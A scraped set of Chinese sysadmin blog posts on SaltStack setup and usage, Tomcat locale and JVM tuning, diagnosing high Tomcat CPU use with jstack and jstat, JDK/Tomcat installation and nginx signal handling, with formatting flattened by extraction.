我这里直接配置的是主机名，也可以配置成IP地址，如果配置成主机名的话，就需要在/etc/hosts文件中master主机对应的IP ，如果使用内部DNS的例外，可以在内部DNS上的统一配置。 在其下增加一行内容为： 1- id: tomcatA1 这里是指定当前主机的id号，这在后面master认证和master调用命令执行时显示的名称，可以根据实际识别需要填写。另外需要注意的是，以上两处配置冒号后面都需要有一个空格，不然会报如下错误： 12log_file: /var/log/salt/minion # 记录受控端运行日志key_logfile: /var/log/salt/key # 记录认证证书日志 主控端和受控端 启动各自的服务，确保服务启动后没有任何报错信息,如果异常请检查相应日志文件处理 12主控端: service salt-master restart受控端: service salt-minion restart saltstack 主控端是依靠openssl证书来与受控端主机认证通讯的，受控端启动后会发送给主控端一个公钥证书文件，在主控端用 salt-key 命令来管理证书。 123salt-key -L # 用来查看证书情况salt-key -a 服务端名称或IP # 用来管理接受证书salt-key -A # 用来管理接受所有认证主机的认证 主控端和被控端的证书默认都存放在/etc/salt/pki/ 中，如果遇到证书不生效的情况下，可在主控端证书存放目录删除受控端证书，重新认证一下。 12345678910111213[root@ny-cloud-pagespeed00 ~]# salt-key -a 192.168.23.24The following keys are going to be accepted:Unaccepted Keys:192.168.23.24Proceed? [n/Y] y #这里输入y 代表同意加入证书。[root@ny-cloud-pagespeed00 minions]# salt -v \"xx.rix.com\" test.ping #这里的.com是受控机的hostname 认证名称。Executing job with jid 20151004162442004183 -------------------------------------------xx.rix.com:True 这里可以获取到认证，那么我们把认证加进去。 123456789101112131415161718192021[root@salt ~]# salt-key -LAccepted Keys:Gateway1Gateway2ihaozhuo1ihaozhuo2nodeopenapireport1report2tomcat_A1tomcat_A2tomcat_B1tomcat_B2tomcat_bmwtomcat_C1tomcat_C2weixinDenied Keys:Unaccepted Keys:Rejected Keys: 我上面用的-A参数，该参数意思是接受所有认证主机的认证，也可以使用 -a id名 只认证单独的主机。默认认证完成后会在/etc/salt/pki/master/minions目录找到以ID名命令的文件，里面存放的是密钥文件。 如果对客户端信任，可以让master自动接受请求，在master端/etc/salt/master配置。 （二）命令执行True代表正常，*代表所有主机，也可以选择单台或者按组及正则进行匹配等，这个可以参看下官方相关文档 。其默认执行的正则是shell正则，也可以使用其他正则或组等，如下： 12345678910111213141516171819202122232425262728293031323334[root@salt ~]# salt '*' test.ping[root@salt ~]# salt '*' test.pingtomcat_C2: Truetomcat_B2: Trueihaozhuo1: Trueihaozhuo2: Trueopenapi: Truetomcat_B1: Truetomcat_C1: Trueweixin: Truetomcat_A1: Truetomcat_A2: Truenode: TrueGateway2: Truereport1: Truereport2: Truetomcat_bmw: TrueGateway1: Minion did not return. [Not connected] 这里可以看到有一台ping不通，就应该上去查看下。 12345678[root@Gateway1 ~]# ps -ef | grep minionroot 15343 15168 0 11:22 pts/0 00:00:00 grep --color=auto minion[root@Gateway1 ~]# service salt-minion startRedirecting to /bin/systemctl start salt-minion.service[root@Gateway1 ~]# ps -ef | grep minionroot 15422 1 7 11:22 ? 00:00:00 /usr/bin/python /usr/bin/salt-minionroot 15431 15422 46 11:22 ? 00:00:00 /usr/bin/python /usr/bin/salt-minionroot 15494 15168 0 11:22 pts/0 00:00:00 grep --color=auto minion 原来是进程挂了，所有这也是salt什么都好唯一一点缺点就是需要配置客户端启动服务，这样对网络传输等等都有要求比较高。一旦进程死了，几百台以上可能就比较费力。 1234- salt 'shell正则' 命令- salt -E 'prel 正则'- salt -N $group 命令- salt -L 'server_id1,server_id2,server_id3' 命令 123456常用的操作类似如下- salt '*' cmd.run \"ab -n 10 -c 2 http://www.google.com/\"- salt '*' grains.ls 查看grains分类- salt '*' grains.items 查看grains所有信息- salt '*' grains.item osrelease 查看grains某个信息- salt '*' cmd.run \"/App/nginx/sbin/nginx -v\"","link":"/2015/10/10/自动化+Jenkins/saltstack/自动化运维工具--Saltstack安装部署配置使用/"},{"title":"自动化运维工具--saltstack远程启动tomcat日志乱码","text":"自动化运维工具–saltstack远程启动tomcat日志乱码最近在线上发布tomcat，想做到自动部署，可是出现了问题，就是日志输出会有乱码，用户名的getMyUserInfo 是一堆乱码，salt原理系统字符集没太深入的研究，后来在墙外看到一篇文章很实用，就做了下自己的总结。 开始我是salt执行远程脚本。 1salt 'tomcat_A1' cmd.run '/etc/init.d/tomcat-account start' 直接这样去执行，发现会出现乱码。 这是日志输出结果，我用curl去调我的userinfoid： 调用之前我这边先删除了指定的用户信息redis的缓存，然后在用curl在另外一台机器上面调用看看。 tomcat_A1 机器日志：乱码： 123456781nickname1:?????????11111nickname1:?????????33333334????????? 在minion设置字符集增加LCALL=”zhUS.UTF-8″： cat /etc/sysconfig/i18n 123LANG=\"en_US.UTF-8\"LC_ALL=\"zh_US.UTF-8\"SYSFONT=\"latarcyrheb-sun16\" cmd.run 调用时需要加入env=’{“LCALL”:“zhCN.UTF-8”}’： 1234salt 'tomcat_A1' cmd.run '/etc/init.d/tomcat-account sop' env='&#123;\"LC_ALL\": \"zh_CN.UTF-8\"&#125;'###先关闭tomcatsalt 'tomcat_A1' cmd.run '/etc/init.d/tomcat-account start' env='&#123;\"LC_ALL\": \"zh_CN.UTF-8\"&#125;'###在启动tomcat 在调用查看 日志就恢复正常了。数据库的用户名id也正常了，如果你写发布脚本把tomcat启动写在执行脚本里面的话，如果添加了不行，就拆分开，就可以了。 这是一次血的教训啊，对字符集不是很多，完全摸不着头脑，还好多普及了下，终于弄好了。","link":"/2015/11/20/自动化+Jenkins/saltstack/自动化运维工具--saltstack远程启动tomcat日志乱码 /"},{"title":"自动化运维工具-Saltstack的详细介绍安装与使用以及语法开发操作","text":"引言:自动化运维1:saltstack 的基本介绍2:salt 的安装 服务端 安装 配置文件 运行 注意事项 客户端 安装 配置文件 运行 注意事项 3:salt 的使用: 基础知识 targeting nodegroup grains pillar 状态管理 state state 语法 state 的逻辑关系 highstate salt schedule 实时管理 cmd.run module 无 master4:salt 开发 saltclient 管理 salt salt api 引言:自动化运维 运维的工作主要在2方面: 状态的管理 系统性能调优 这里主要简介下运维状态的管理:对于运维来说,基于状态的配置管理已经向自动化迈进了一大步,以状态为核心的运维,让状态本身有了可管理性;在运维过程中我们会发现,同样的一个配置,我们会在不同的时间, 不同的地点一次在一次的配置,这个时候,配置管理就有了重复性;有的甚至是原封不动的重 复,而另外一些则是按照一定的规律在发展,这些按照一定规律发展的配置,就是可预测的.综 上我认识的,我们运维工作的本身是可管理,可重复,可预测的.基于这样的理念,我们就可以更 高一步的推进我们的运维自动化,甚至到智能化. 看到这里,我理想中的运维自动化的配置管理平台应该有如下功能: 对状态的配置及管理(最基本的) 可以及时的对系统状态进行调整并能看到结果(可以方便的实时升级系统状态) 可以对其本身做方便的第三方管理(借助其 API,直接给状态制定好其发展方向) 加分项: 开发语言单一 架构简单,灵活 有不差的安全性 没有商业版下面是现有比较有代表性的自动化配置管理工具: 附:以下仅基于开源版本进行介绍 理念 优缺点puppet 从运维的角度去做配置管理(运维人员做给运维用的) 架构简单,系统比较成熟/不便于第三方管理 chef 从研发的角度去做配置管理(研发人员做给运维用的) 较便于第三方管理,对自身(节点,变量,cookbook)的管理较方便,有自己的 dashboard,cookbook 支持版本管理,自从 cookbook 的版本管理/架构复杂,开发语言较多,(安全问题) 以上 2 者都比较侧重于状态的管理,对单个或者多个状态的临时调整或者管理较差 2 个都有商业版,让我这个用开源版的很自卑 这里我们也能看到,2 个配置功能都没能达到我理想中的状态,那就暂用 chef 吧,直到有 一天,了解到了 saltstack 看到了这句话:“ 系统配置的自动化不仅可预测,可重复, 还具有可 管理性”(http://wiki.saltstack.cn/reproduction/dive-into-saltstack),这尼玛才是运维自动化的未 来啊,于是毫无节操的开始学习 salt,而且发现越学越喜欢;在我使用 puppet 及 chef 的时 候都没有使用 salt 的感觉,太爽了。所以我这里仅仅介绍几本的语法不涉及实际用例,salt 的安装非常方便,所以你在看本文档的时候希望你能真正的动手去做一下,然后你就会爱上 salt 了 1附:如果你会 python,salt 基本是不需要怎么学的,而我正好了解一点 py,不过这最多占我选择 salt 的 20%。 1:saltstack 的基本介绍salt 是一个新的基础平台管理工具。很短的时间即可运行并使用起来, 扩展性足以支撑管理上万台服务器,数秒钟即可完成数据传递. 经常被描述为 Func 加强版+Puppet 精简版。 salt 的整个架构都是基于消息来实现.所以能够提供横强的拓展性,灵活性,实时性;不夸 了,看实际的 slat 是什么样的不过 salt 还是一个很年轻的东西,还有很多地方不够完善,做的不够好,不过我相信这 些都只是时间问题。 注:以下文档仅仅为基本内容,相关知识点的深入学习,请看相应文档连接 ##2:salt 的安装 安装有很多途径,作为一个 centos 的用户,我选择 rpm 首先添加 RPM 源:rpm -ivh http://mirrors.sohu.com/fedora-epel/6/x86_64/epel-release-6-8.noarch.rpm 附:实际生产中我是自建源epel 中关于 salt 的包: 1234salt-api.noarch : A web api for to access salt the parallel remote execution system salt-master.noarch : Management component for salt, a parallel remote executionsystemsalt-minion.noarch : Client component for salt, a parallel remote execution system salt.noarch : A parallel remote execution systemsalt-cloud.noarch : Generic cloud provisioning tool 1:服务端 1:安装123456789101112131415yum install salt-master 2:配置文件/etc/salt/master配置文件选项介绍: http://docs.saltstack.com/ref/configuration/master.html最基本字段:interface: 服务端监听 IP3:运行 调试模式:salt-master -l debug 后台运行:salt-master -d作为 centos 管理员,我选择:/etc/init.d/salt-master start 4:注意事项:1:监听端口4505(publish_port):salt 的消息发布系统 4506(ret_port):salt 客户端与服务端通信的端口所以确保客户端能跟服务端的这2个端口通信 安装客户端123456789101112131415161718192021222324252627282930313233343536373839yum install salt-minion 2:配置文件/etc/salt/minion配置文件选项介绍: http://docs.saltstack.com/ref/configuration/minion.html 最基本字段:master: 服务端主机名id: 客户端主机名(在服务端看到的客户端的名字)3:运行 调试模式:salt-minion -l debug 后台运行:salt-minion -d作为 centos 管理员,我选择:/etc/init.d/salt-minion start 4:注意事项:1:minion 默认和主机名 salt 的主机通信 2:关于配置文件salt 的配置文件均为 yaml 风格$key: $value #注意冒号后有一个空格 3:基础知识1:salt minion 和 master 的认证过程:(1) minion 在第一次启动时,会在/etc/salt/pki/minion/下自动生成minion.pem(private key), minion.pub(public key),然后将 minion.pub 发送给 master(2) master 在接收到 minion 的 public key 后,通过 salt-key 命令 accept minion public key,这样在 master 的/etc/salt/pki/master/minions 下的将会存放以 minion id 命名的public key, 然后 master 就能对 minion 发送指令了如下: 启动服务端:/etc/init.d/salt-minion restart启动客户端:/etc/init.d/salt-minion restart 服务端查看key:salt-keyAccepted Keys:Unaccepted Keys: minion1Rejected Keys:服务端接受 key salt-key -a minion1测试:salt 'minion1' test.ping minion1:True附:salt 更多命令及手册 salt '*' sys.doc 3:salt 的使用: 1:基础知识1:targeting 123456789salt '*' test.ping引号中以实现很强大的 minion 的过滤与匹配技术 文档:http://docs.saltstack.com/topics/targeting /compound.html常用命令:salt 'shell 正则' 命令salt -E 'prel 正则'salt -N $group 命令salt -L 'server_id1,server_id2,server_id3' 命令示例:salt -C 'webserv* and G@os:Debian or E@web-dc1-srv.*' test.ping 2:nodegroup对 minion 进行分组 1234567文档: http://docs.saltstack.com/topics/targeting/nodegroups.html 在 master 的配置文件中按如下格式定义:nodegroups:group1: 'L@foo.domain.com,bar.domain.com,baz.domain.com orbl*.domain.com'group2: 'G@os:Debian and foo.domain.com' 在 state 或者 pillar 中引用的时候如下:base: group1:- match: nodegroup - webserver 3:grainsminion 基本信息的管理 文档:http://docs.saltstack.com/topics/targeting /grains.html 基本使用: 123456salt '*' grains.ls 查看 grains 分类salt '*' grains.items 查看 grains 所有信息salt '*' grains.item osrelease 查看 grains 某个信息示例:salt '*' grains.item osrelease minoin1:osrelease: 6.2 minion 的变量在用 salt 进行管理客户端的时候或者写 state 的时候都可以引用 grains 的变量 4:pillar salt 敏感信息的管理,只有匹配到的节点才能看到和使用 文档:http://docs.saltstack.com/topics/tutorials/pillar.html 默认:pillar 数据定义文件存储路径:/srv/pillar 入口文件:/srv/pillar/top.sls 12345678910111213141516171819202122232425262728293031格式: base:\"targeting\":- $pillar$pillar.sls 基本:$key: $value state 引用方式:&#123;&#123; pillar['$key'] &#125;&#125;复杂:users:thatch: 1000 shouse: 1001 utahdave: 1002 redbeard: 1003state 引用方式:&#123;% for user, uid in pillar.get('users', &#123;&#125;).items() %&#125;&#123;&#123;user&#125;&#125;: user.present:- uid: &#123;&#123;uid&#125;&#125; &#123;% endfor %&#125;查看节点的 pillar 数据: salt 'client2' pillar.data同步 pillar:salt '*' saltutil.refresh_pillar附:这里我们可以看到,pallar 中也可以使用 jinja(后面会提到)做一些处理 5:minion即为 salt 的客户端2:状态管理 1:statesalt 基于 minion 进行状态的管理 1:state 语法文档:http://docs.saltstack.com/ref/states/all/index.html#名字为pillar.sls的文件来存放对匹配到的&#123;% if grains['os_family'] == 'RedHat' %&#125; - name: vim-enhanced&#123;% elif grains['os'] == 'Debian' %&#125;- name: vim-nox&#123;% elif grains['os'] == 'Ubuntu' %&#125; - name: vim-nox&#123;% endif %&#125;- installed如果是 redhard 系列的就安装 vim-enhanced,如果系统是 Debian 或 者 Ubuntu 就安装 vim-nox以有多个附:state 默认使用 jinja(http://jinja.pocoo.org/)的模板语法, 文档地址: http://jinja.pocoo.org /docs/templates/ 2:state 的逻辑关系: 文档:http://docs.saltstack.com/ref/states/ordering.html 1234567require:依赖某个 state,在运行此 state 前,先运行依赖的 state,依赖可httpd: pkg:- installed file.managed:- name: /etc/httpd/conf/httpd.conf - source: salt://httpd/httpd.conf- require:- pkg: httpd watch:在某个 state 变化时运行此模块 redis: 123456789pkg:- latestfile.managed:- source: salt://redis/redis.conf- name: /etc/redis.conf- require:- pkg: redis service.running: - enable: True#state 的名字 $state: #要管理的模块类型 - $State states #该模块的状态 123- watch:- file: /etc/redis.conf - pkg: redis 附:watch 除具备 require 功能外,还增了关注状态的功能 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849order:优先级比 require 和 watch 低有 order 指定的 state 比没有 order 指定的优先级高 vim:pkg.installed: - order: 1想让某个 state 最后一个运行,可以用 last 3:state 与 minion将临时给 minoin 加个 statesalt 'minion1' state.sls 'vim' #给 minion1 加一个 vim 的 state 执行该命令后可以立即看到输出结果2:highstate给 minion 永久下添加状态文档: http://docs.saltstack.com/ref/states/highstate.html 默认配置文件:/srv/salt/top.sls语法:'*':- core- wsproxy - /srv/salt/目录结构:.├── core.sls ├── top.sls └── wsproxy├── init.sls ├── websocket.py └── websockify应用:salt \"minion1\" state.highstate测试模式:salt \"minion1\" state.highstate -v test=True 3:salt schedule默认的 state 只有在服务端调用的时候才执行,很多时候我们希望 minon 自觉 的去保持在某个状态文档:http://docs.saltstack.com/topics/jobs/schedule.htmlcat /srv/pillar/top.sls base:\"*\":- schedulecat /srv/pillar/schedule.sls schedule:highstate:function: state.highstate minutes: 30如上配置:minion 会没 30 分钟从 master 拉去一次配置,进行自我配置3:实时管理 有时候我们需要临时的查看一台或多台机器上的某个文件,或者执行某个命令1:cmd.run用法 salt '$targeting' cmd.run '$cmd'示例:salt '*' cmd.run 'hostname' 执行下这样的命令,马上就感受到效果了,速度还贼快2:module同时,salt 也将一些常用的命令做了集成 文档:http://docs.saltstack.com/ref/modules/all/index.html 这里几乎涵盖了我们所有的常用命令比如:查看所有节点磁盘使用情况salt '*' disk.usage 文档:http://docs.saltstack.com/topics/tutorials/quickstart.html4:无 master主要应该在测试和 salt 单机管理的时候 4:salt 开发1:saltclient 管理 salt只有才 master 才可以salt 全部用 python,这里也用 python文档:http://docs.saltstack.com/ref/python-api.html 示例: 1234import salt.clientclient = salt.client.LocalClient()ret = client.cmd('*', 'cmd.run', ['ls -l'])print ret 2:salt apisalt api 我现在还没用,不过我也没搞定,如果你搞定了,我会非常感谢你能分享下的。 ####参考文档: 1:salt 中文 wiki:http://wiki.saltstack.cn/ 很不错的文章:http://wiki.saltstack.cn/reproduction/dive-into-saltstack2:salt 官网 http://saltstack.com/ 官网文档:http://docs.saltstack.com/","link":"/2015/09/10/自动化+Jenkins/saltstack/自动化运维工具-Saltstack的详细介绍安装与使用以及语法开发操作/"},{"title":"tomcat优化遇到jdk1.8出现⚠️警告：warning:ignoring option PermSize=512msupport was removed in 8.0","text":"tomcat性能优化：Java HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=512m; support was removed in 8.0这个提示应该是升级JDK1.8以上 在Java的8命令行标志MaxPermSize已被删除。其原因是，持久代从热点堆中取出并转移到本机内存。所以为了消除这种信息编辑java_OPTS环境用户变量。 在网上查询到： -XX：MaxPermSize =size设置最大永久代空间的大小（以字节为单位）。此选项是不赞成使用JDK 8，并通过-XX取代：MaxMetaspaceSize选项。 -XX：PermSize = size设置分配给永久代如果超过触发垃圾收集的空间（以字节为单位）。该选项已被否决JDK 8，并通过-XX取代：MetaspaceSize选项。 我所在 1JAVA_OPTS==\"-Xmx512m -XX:MaxPermSize=256m\" 在我的系统的.bashrc，将其更改为 1JAVA_OPTS=\"-Djava.awt.headless=true -Dfile.encoding=UTF-8 -server -Xms1024m -Xmx1024m -XX:NewSize=512m -XX:MaxNewSize=512m -XX:+DisableExplicitGC\"","link":"/2016/03/21/Web服务技术/tomcat/tomcat优化遇到jdk1.8出现⚠️警告：warning:ignoring option PermSize=512msupport was removed in 8.0/"},{"title":"记录tomcat进程CPU使用率高排查故障经验","text":"1、故障现象运营同事反馈APP其中体检商城购买订单系统运行缓慢，访问出现超时，多次重启系统后问题依然存在，使用top命令查看服务器情况，发现CPU占用率过高。 2、CPU占用过高问题定位2.1、定位问题进程使用top命令查看资源占用情况，发现pid为14063的进程占用了大量的CPU资源，CPU占用率高达229.1%，内存占用率也达到了29.8% 123456789[root@account-tomcat-01 ~]$ toptop - 14:51:10 up 233 days, 11:40, 2 users, load average: 6.85, 5.62, 3.97Tasks: 192 total, 2 running, 190 sleeping, 0 stopped, 0 zombie%Cpu(s): 97.3 us, 0.3 sy, 0.0 ni, 2.5 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 stKiB Mem : 16268652 total, 5114392 free, 6907028 used, 4247232 buff/cacheKiB Swap: 4063228 total, 3989708 free, 73520 used. 8751512 avail Mem PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 14063 root 20 0 9260488 4.627g 11976 S 229.1 29.8 117:41.66 java 2.2、定位问题线程使用ps -mp pid -o THREAD,tid,time命令查看该进程的线程情况，发现该进程的多个线程占用率很高 123456789101112131415161718[root@account-tomcat-01 ~]$ ps -mp 14063 -o THREAD,tid,time USER %CPU PRI SCNT WCHAN USER SYSTEM TID TIME 361 - - - - - - 02:05:58root 0.0 19 - futex_ - - 14063 00:00:00root 0.0 19 - poll_s - - 14064 00:00:00root 44.5 19 - - - - 14065 00:15:30root 44.5 19 - - - - 14066 00:15:30root 44.4 19 - - - - 14067 00:15:29root 44.5 19 - - - - 14068 00:15:30root 44.5 19 - - - - 14069 00:15:30root 44.5 19 - - - - 14070 00:15:30root 44.5 19 - - - - 14071 00:15:30root 44.6 19 - - - - 14072 00:15:32root 2.2 19 - futex_ - - 14073 00:00:46root 0.0 19 - futex_ - - 14074 00:00:00root 0.0 19 - futex_ - - 14075 00:00:00root 0.0 19 - futex_ - - 14076 00:00:00root 0.7 19 - futex_ - - 14077 00:00:15 从输出信息可以看出，14065~14072之间的线程CPU占用率都很高2.3、查看问题线程堆栈 挑选TID为14065的线程，查看该线程的堆栈情况，先将线程id转为16进制，使用printf “%x\\n” tid命令进行转换 12345678910111213141516[root@account-tomcat-01 ~]$ printf \"%x\\n\" 1406536f1再使用jstack命令打印线程堆栈信息，命令格式：jstack pid |grep tid -A 30[root@root-web-01 ~]$ jstack 14063 |grep 36f1 -A 30\"GC task thread#0 (ParallelGC)\" prio=10 tid=0x00007fa35001e800 nid=0x36f1 runnable \"GC task thread#1 (ParallelGC)\" prio=10 tid=0x00007fa350020800 nid=0x36f2 runnable \"GC task thread#2 (ParallelGC)\" prio=10 tid=0x00007fa350022800 nid=0x36f3 runnable \"GC task thread#3 (ParallelGC)\" prio=10 tid=0x00007fa350024000 nid=0x36f4 runnable \"GC task thread#4 (ParallelGC)\" prio=10 tid=0x00007fa350026000 nid=0x36f5 runnable \"GC task thread#5 (ParallelGC)\" prio=10 tid=0x00007fa350028000 nid=0x36f6 runnable \"GC task thread#6 (ParallelGC)\" prio=10 tid=0x00007fa350029800 nid=0x36f7 runnable \"GC task thread#7 (ParallelGC)\" prio=10 tid=0x00007fa35002b800 nid=0x36f8 runnable \"VM Periodic Task Thread\" prio=10 tid=0x00007fa3500a8800 nid=0x3700 waiting on condition JNI global references: 392 从输出信息可以看出，此线程是JVM的gc线程。此时可以基本确定是内存不足或内存泄露导致gc线程持续运行，导致CPU占用过高。 所以接下来我们要找的内存方面的问题 3.1、使用jstat -gcutil命令查看进程的内存情况 12345678910111213[root@account-tomcat-01 ~]$ jstat -gcutil 14063 2000 10 S0 S1 E O P YGC YGCT FGC FGCT GCT 0.00 0.00 100.00 99.99 26.31 42 21.917 218 1484.830 1506.747 0.00 0.00 100.00 99.99 26.31 42 21.917 218 1484.830 1506.747 0.00 0.00 100.00 99.99 26.31 42 21.917 219 1496.567 1518.484 0.00 0.00 100.00 99.99 26.31 42 21.917 219 1496.567 1518.484 0.00 0.00 100.00 99.99 26.31 42 21.917 219 1496.567 1518.484 0.00 0.00 100.00 99.99 26.31 42 21.917 219 1496.567 1518.484 0.00 0.00 100.00 99.99 26.31 42 21.917 219 1496.567 1518.484 0.00 0.00 100.00 99.99 26.31 42 21.917 220 1505.439 1527.355 0.00 0.00 100.00 99.99 26.31 42 21.917 220 1505.439 1527.355 0.00 0.00 100.00 99.99 26.31 42 21.917 220 1505.439 1527.355 从输出信息可以看出，Eden区内存占用100%，Old区内存占用99.99%，Full GC的次数高达220次，并且频繁Full GC，Full GC的持续时间也特别长，平均每次Full GC耗时6.8秒（1505.439/220）。根据这些信息，基本可以确定是程序代码上出现了问题，可能存在不合理创建对象的地方。 生产java应用，CPU使用率一直很高，经常达到100%，通过以下步骤完美解决，分享一下。 123456789101112131.jps 获取Java进程的PID。2.top -H -p PID 查看对应进程的哪个线程占用CPU过高。2.1 使用 ps -mp pid -o THREAD,tid,time 命令查看该进程的线程情况，发现该进程的多个线程占用率很高。3.jstack pid &gt;&gt; java.txt 导出CPU占用高进程的线程栈。使用jstack命令查看进程的堆栈情况4.echo “obase=16; PID” | bc 将线程的PID转换为16进制。5.在第二步导出的Java.txt中查找转换成为16进制的线程PID。找到对应的线程栈。6.分析负载高的线程栈都是什么业务操作。优化程序并处理问题。","link":"/2016/12/02/Web服务技术/tomcat/记录tomcat进程CPU使用率高排查故障经验/"},{"title":"搭建配置tomcat环境","text":"先安装jdk-java环境首先先检查linux机器上是否有自带的jdk,一般不建议用yum安装，环境变量不方便自定义。 java -version检查下就可以，如果有版本低的话可以先卸载掉方法如下： 1234[root@localhost java]# rpm -qa|grep gcj 或者 rpm -qa|grep javalibgcj-4.1.2-44.el5java-1.4.2-gcj-compat-1.4.2.0-40jpp.115 如果没有信息就是没有安装、如果有那么如下操作: 123[root@localhost]# yum -y remove java-1.4.2-gcj-compat-1.4.2.0-40jpp.115 或者 rpm -e --nodeps java-1.4.2-gcj-compat-1.4.2.0-40jpp.115Complete!(看到这个说明完成了。。) 卸载完成了 如果其他目录有这个安装好的。直接拷贝过去，做个变量就行. JDK官网下载地址：jdk-8u60-linux-x64.tar.gz 123下载jdk命令：wget --header \"Cookie: oraclelicense=accept-securebackup-cookie” http://download.oracle.com/otn-pub/java/jdk/8u144-b01/090f390dda5b47b9b721c7dfaa008135/jdk-8u144-linux-x64.tar.gz 编译安装jdk 12345678curl -O http://oak0aohum.bkt.clouddn.com/jdk1.7.0_67.tar.gz -C /srv/设置环境变量：cd /etc/profile.d/ 放到这下面写个变量java.shexport JAVA_HOME=/srv/jdk1.7.0_67export CLASS_PATH=\"$JAVA_HOME/lib:$JAVA_HOME/jre/lib\"export PATH=$PATH:$JAVA_HOME/bin 添加完毕保存退出. 123source /etc/profileecho $JAVA_HOME/usr/java/jdk1.7.0 安装：apache-tomcat 先下载tomcat包：apache-tomcat-8.0.41-src.tar.gz 配置端口 b不要有冲突了默认是8080这里修改成8082。 （1）采用记事本打开Tomcat安装目录下的conf文件夹下的servlet.xml文件。（2）在servlet.xml文件中找到以下代码： 123 &lt;Connector port=\"8082\" protocol=\"HTTP/1.1\" URIEncoding=\"UTF-8\"connectionTimeout=\"20000\" redirectPort=\"8443\" /&gt; （3）将上面代码中的port=&quot;8080&quot;修改为port=&quot;8082&quot;，即可将Tomcat的默认端口设置为8081。在修改端口时，应避免与公用端口冲突。建议采用默认的8080端口，不要修改，除非8080端口被其他程序所占用。 Connector子元素下的port是设置服务器端口，而connection Timeout则是服务器连接超时单位为毫秒. （4）URIEncoding=”UTF-8 设置是让tomcat支持中文，不会出现乱码 ###配置防火墙 允许然后把8082 这个端口开放到指定的办公网络端口访问。 1-A INPUT -i eth0 -s 192.168.1.0/24 -p tcp -m state --state NEW -m tcp --dport 8082 -j ACCEPT 进入linux系统下tomcat的bin目录， 比如，进入到 apache-tomcat-7.0.42/bin 目录 关闭一下tomcat服务，特别是已经启动的情况下，只不过有些异常 1./shutdown.sh ####3. 检查tomcat启动进程 ps -ef|grep tomcat 假如出现以下类似的提示，表示tomcat已经关闭 root 30248 30113 0 10:00 pts/0 00:00:00 grep java ####4. 最后重新启动tomcat 1./startup.sh 也可以写启动脚本，配置好jdk和tomcat的环境变量。","link":"/2015/11/21/Web服务技术/tomcat/搭建配置tomcat环境/"},{"title":"Nginx 的启动、停止、平滑重启、信号控制和平滑升级","text":"Nginx 的启动、停止、平滑重启、信号控制和平滑升级Nginx的启动假设 nginx 安装在/usr/local/nginx 目录中，那么启动 nginx 的命令就是： 1[root@Nginx_01 ~]# /usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf 参数&quot;-c&quot; 指定了配置文件的路径，如果不加&quot;-c&quot;参数，Nginx 会默认加载其安装目录的 conf 子目录中的 nginx.conf 文件。 Nginx的停止nginx 的停止方法有很多，一般通过发送系统信号给 nginx 的主进程的方式来停止 nginx。 1、从容停止Nginx 123[root@Nginx_01 ~]# kill -QUIT 【Nginx主进程号】或者[root@Nginx_01 ~]# kill -QUIT `/usr/local/nginx/logs/nginx.pid` 字符是数字键盘 1 字符左边的那个字符，不需要 Shift，直接按 ` 字符即可。如果在 nginx.conf 配置文件中指定了 pid 文件存放的路径，该文件中存放的就是 nginx 当前的主进程号。默认是放在 nginx 安装目录的 logs 目录下。 2、快速停止Nginx 12345678[root@Nginx_01 ~]# kill -TERM 【Nginx主进程号】或者[root@Nginx_01 ~]# kill -INT 【Nginx主进程号】 ``` &gt;3、强制停止所有 nginx 进程 ```bash[root@Nginx_01 ~]# pkill -9 nginx Nginx的平滑启动如果改变了 nginx 的配置文件，想重启 nginx，同样可以发送系统信号给 nginx 主进程的方式来进行。不过，重启之前，要确认 nginx 配置文件的语法是否正确的。否则 nginx 将不会加载新的配置文件。可以通过以下命令来判断配置文件是否正确： 123456789# -t 参数将检查配置文件的语法是否正确，默认会检查 /usr/local/nginx/conf/nginx.conf 文件。 [root@Nginx_01 ~]# /usr/local/nginx/sbin/nginx -t # 如果要对指定的配置文件进行语法检查，可以继续添加 -c 参数 [root@Nginx_01 ~]# /usr/local/nginx/sbin/nginx -t -c /usr/local/nginx/conf/nginx.conf 这个时候，就可以平滑重启 nginx 了。 [root@Nginx_01 ~]# kill -HUP 【Nginx主进程号】 当 nginx 接收到 HUP 信号时，它会尝试先解析配置文件，如果成功，就应用新的配置文件(例如，重新打开日志文件或监听的套接字)。之后，nginx 运行新的工作进程并从容关闭旧的工作进程。通知工作进程关闭监听套接字，但是继续为当前连接的客户提供服务。所有的客户端的服务完成后，旧的工作进程被关闭。如果新的配置文件应用失败，nginx 将继续使用旧的配置文件进行工作。 Nginx 的平滑升级当需要将正在运行中的 nginx 升级、添加/删除服务器模块时，可以在不中断服务的情况下，使用新版本、重编译的 nginx 可执行程序替换旧版本的课执行程序。步骤如下： 12345678910111213141516171819(1) 使用新的可执行程序替换旧的可执行程序，对于编译安装的 nginx，可以将新版本编译安装到旧版本的 nginx 安装路径中。替换之前，最好备份一下旧的可执行文件。 (2) 发送以下指令： [root@Nginx_01 ~]# kill -USR2 【旧颁布的Nginx主进程号】 (3) 旧版本 nginx 的主进程将重命名它的 pid 文件为 .oldbin(例如：/usr/local/nginx/logs/nginx.pid.oldbin)，然后执行新版本的 nginx 可执行程序，依次启动新的主进程和新的工作进程。 (4) 此时，新、旧版本的 nginx 实例会同时运行，共同处理输入的请求。要逐步停止旧版本的 nginx 实例，你必须发送 WINCH 信号给旧的主进程，然后，它的工作进程就将开始从容关闭：[root@Nginx_01 ~]# kill -WINCH 【旧版本的Nginx主进程号】 (5) 一段时间后，旧的工作进程(worker process)处理了所有已连接的请求后退出，仅由新的工作进程来处理输入的请求了。 (6) 这时候，我们可以决定是使用新版本，还是恢复到旧版本： [root@Nginx_01 ~]# kill -HUP 【旧的主进程号】：nginx 将在不重载配置文件的情况下启动它的工作进程 [root@Nginx_01 ~]# kill -QUIT 【新的主进程号】：从容关闭其工作进程(worker process) [root@Nginx_01 ~]# kill -TERM 【新的主进程号】：强制退出 [root@Nginx_01 ~]# kill 【新的主进程号或旧的主进程号】：如果因为某些原因新的工作进程不能退出，则向其发送 kill 信号 新的主进程退出后，旧的主进程会移除 .oldbin 后缀，恢复为它 的 .pid 文件，这样，一切就恢复到升级之前了。如果尝试升级成功，而你也希望保留新的服务器时，可发送 QUIT 信号给旧的主进程，使其退出而只留下新的服务器运行。 1234567891011121314151617上图是nginx官方网站对nginx信号的解释文档截取下面是一些常见nginx命令nginx -c /path/to/nginx.conf // 